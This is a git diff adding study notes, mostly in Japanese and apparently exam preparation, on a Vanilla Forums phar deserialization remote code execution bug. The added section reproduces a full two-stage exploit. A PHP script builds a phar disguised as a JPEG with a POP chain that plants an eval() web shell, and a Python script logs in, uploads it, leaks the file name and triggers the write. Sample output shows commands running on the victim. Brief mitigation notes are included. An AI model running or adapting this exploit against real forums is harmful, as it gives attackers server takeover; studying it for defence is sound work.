@@ -10,7 +10,6 @@
 - [Vuln](#vuln)
   - [sample](#sample)
   - [Deserialization](#deserialization)
-    - [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution](#vanilla-forums-importcontroller-index-file_exists-unserialize-remote-code-execution)
     - [Apache Groovy (CVE-2015-3253)](#apache-groovy-cve-2015-3253)
     - [nodejs-serialize (CVE-2017-5941)](#nodejs-serialize-cve-2017-5941)
     - [serialize-to-js (Node.js)](#serialize-to-js-nodejs)
@@ -151,9 +150,240 @@ class ImportController extends DashboardController {
             $imp->deleteState();
         }
 ```
+攻撃手順は、まず`phar`形式のファイルpoc.jpgを作成する。これは`jpg`ファイルに偽装してるが`phar`形式のファイルでありメタデータにシリアライズしたオブジェクトが書かれれている。   
+このpopchainについては以下を参照。   
+https://github.com/takabaya-shi/AWAE-preparation/blob/main/php/PHP%20Object%20Injection/README.md   
+https://hackerone.com/reports/407552   
+```php
+<?php
+/*
+
+Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability
+mr_me 2018
+
+## Notes:
+
+- This is the file that generates the payload to help trigger the bug
+- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc
+  if needed. I have installed my version of Vanilla Forums in /var/www/html
+
+## Example:
+
+The following steps are used to re-create the vulnerability:
+
+1. We create our phar file:
+
+`saturn:~ mr_me$ php poc-stage-1.php`
+
+3. We run the poc-stage-2.py which will trigger the bug
+
+```
+saturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123
+(+) targeting: http://172.16.175.143
+(+) logged in!
+(+) uploaded phar!
+(+) leaked phar name!
+(+) triggered a write!
+(+) shell at: http://172.16.175.143/?c=phpinfo();
+
+saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Now, on the victim box:
+
+```
+steven@pluto:/var/www/html/conf$ cat constants.php 
+<?php if (!defined('APPLICATION')) exit();
+$a=eval($_GET[c]);//[''] = '';
+
+// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$
+```
+*/
+
+// custom pop chain, as used in other exploits
+class Gdn_ConfigurationSource{
+    public function __construct(){
+        $this->Type = "file";
+        $this->Source = "/var/www/html/conf/constants.php";
+        $this->Group = 'a=eval($_GET[c]);//';
+        $this->Settings[""] = "";       
+        $this->Dirty = true;
+        $this->ClassName = "Gdn_ConfigurationSource";
+    }
+}
+class Gdn_Configuration {
+    public $sources = [];
+    public function __construct(){
+        $this->sources['si'] = new Gdn_ConfigurationSource();
+    }
+}
+
+// create new Phar
+$phar = new Phar('poc.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+// add our object as meta data
+$phar->setMetadata(new Gdn_Configuration());
+$phar->stopBuffering();
+
+// we rename it now
+rename("poc.phar", "poc.jpg");
+```
+次にこのファイルをアップロードして、何らかのリクエストで`file_exists()`の中にこのアップされたファイルへのパスを挿入する。   
+まずCSRFトークンを取得する。以降の手順ではすべてリクエストにCSRFトークンがないとダメっぽいので取得しておく。   
+次に`jpg`に偽装した`phar`ファイルをアップロードする。   
+次にアップした`phar`ファイルの名前を取得する。`attack.jpg`とかでアップしても実際にはタイムスタンプとかランダムな名前で保存されることになるので。   
+次に得られたファイル名で`phar://.../???.jpg`のパスを作成してリクエストして`file_exitst()`の中にInjectする！   
+```python
+import re
+import sys
+import string
+import random
+import urllib2
+import requests
+
+def get_csrf(t, c):
+    """
+    Gets the csrf for any page thats logged in.
+    """
+    r = s.get("%s/index.php" % t)
+    match = re.search("TransientKey\":\"(.*)\",\"W", r.text)
+    if match:
+        Vanilla_tk = r.headers['Set-Cookie']
+        csrf = match.group(1)
+        if Vanilla_tk.split("=")[1].startswith(csrf):
+            return Vanilla_tk
+
+def get_csrf_login(t):
+    """
+    Gets the CSRF cookie for the login process
+    """
+    r = requests.get("%s/index.php?p=/entry/signin" % t)
+    match = re.search("TransientKey\":\"(.*)\",\"W", r.text)
+    if match:
+        Vanilla_tk = r.headers['Set-Cookie']
+        csrf = match.group(1)
+        if Vanilla_tk.split("=")[1].startswith(csrf):
+            return Vanilla_tk
+
+def extract_csrf(csrf):
+    """
+    Extracts the csrf token from the cookie
+    """
+    token = urllib2.unquote(csrf).decode('utf8')
+    m = re.search("Vanilla-tk=(.*)\:\d{1,2}:", token)
+    if m:
+        k = m.group(1)
+        c["Vanilla-tk"] = token.split("=")[1]
+        return k, c
+
+def we_can_trigger_unserialize(t, csrf):
+    """
+    This is our malicious phar:// and it can be in a share if we are targeting windows.
+    Change the path if you need to.
+    """
+    k, c = extract_csrf(csrf)
+    p = {
+        "TransientKey": k,
+        "PathSelect": "phar:///var/www/html/uploads/%s.jpg" % leaked,    # This is where we do the injection. This trick is quite old actually.
+    }
+    r = s.post("%s/index.php?p=/dashboard/import" % t, data=p)
+    if r.status_code == 200 and "Email is required" in r.text:
+        return True
+    return False
+
+
+def we_can_leak_phar_name(t, csrf):
+    """
+    This function leaks the filename of the image. We use the General category
+    because its default id is 1.
+    """
+    global leaked
+    k, c = extract_csrf(csrf)
+    r = s.get("%s/index.php?p=/categories" % t)
+    r.text
+    match = re.search("uploads/(.*).jpg\" class=\"CategoryPhoto\" alt=\"General\"", r.text)
+    if match:
+        leaked = match.group(1)
+        return True
+    return False
+
+def we_can_upload(t, csrf):
+    """
+    This function uploads the phar archive that we crafted
+    """
+    k, c = extract_csrf(csrf)
+    f = { 'Photo_New': open('poc.jpg', 'rb') }
+    p = {
+      'TransientKey': k,
+      'CategoryID': 1,
+      'Save': "Save",
+    }
+    r = s.post("%s/index.php?p=/vanilla/settings/editcategory" % t, files=f, data=p, allow_redirects=False)
+    if r.status_code == 302 and "vanilla/settings/categories" in r.headers['Location']:
+        return True
+    return False
+
+
+def we_can_login(t, usr, pwd, csrf):
+    """
+    We just log in with this function
+    """
+    global s
+    s = requests.session()
+    k, c = extract_csrf(csrf)
+    p = {
+        "TransientKey": k,
+        "Email": usr,
+        "Password": pwd,
+        "DeliveryType": "VIEW",
+    }
+    r = s.post("%s/index.php?p=/entry/signin" % t, cookies=c, data=p)
+    if r.status_code == 200 and "\"FormSaved\": true" in r.text:
+        return True
+    return False
+
+def main():
+    """
+    Start the pain train
+    """
+    global c, pwner_user
+    if len(sys.argv) != 3:
+        print "(+) usage: %s <target> <username:password>" % sys.argv[0]
+        print "(+) eg: %s 172.16.175.143 admin:admin123" % sys.argv[0]
+        sys.exit(-1)
+    t = "http://%s" % sys.argv[1]
+    c = sys.argv[2]
+    usr = c.split(":")[0]
+    pwd = c.split(":")[1]
+    c = {}
+    print "(+) targeting: %s" % t
+    if we_can_login(t, usr, pwd, get_csrf_login(t)):
+        print "(+) logged in!"
+        csrf = get_csrf(t, c)
+        if we_can_upload(t, csrf):
+            print "(+) uploaded phar!"
+            if we_can_leak_phar_name(t, csrf):
+                print "(+) leaked phar name %s.jpg!" % leaked
+                if we_can_trigger_unserialize(t, csrf):
+                    print "(+) triggered a write!"
+                    print "(+) shell at: %s/?c=phpinfo();" % (t)
+
+if __name__ == '__main__':
+    main()
+```
 - 発見方法   
+アップロードする機能があって、かつ`file_exitst()`の中にユーザーの入力がValidation無しで入ることが問題なので、`file_exits`の中に入る値を逆算していけば見つけられそう？   
 - 対策   
+ユーザーの入力に`phar`,`:`,`://`などが入っていることが問題。拡張子だけチェックしても子の場合はどうしようもない。   
+ここら辺のValidationをする部分がないのが問題。   
 - 参考資料   
+https://hackerone.com/reports/407552   
+https://blog.ohgaki.net/php-phar-remote-code-execution-vulnerability   
+`phar`の脆弱性についての情報。かなりわかりやすい。   
 ### Apache Groovy (CVE-2015-3253)
 - 概要   
 バージョン1.7.0 through 2.4.3で、MethodClosureクラスがデシリアライズされてしまうことが脆弱。このクラスはインスタンスを作成するだけで任意コマンドを実行できる仕様なので、デシリアライズするだけでRCEできてしまう。   
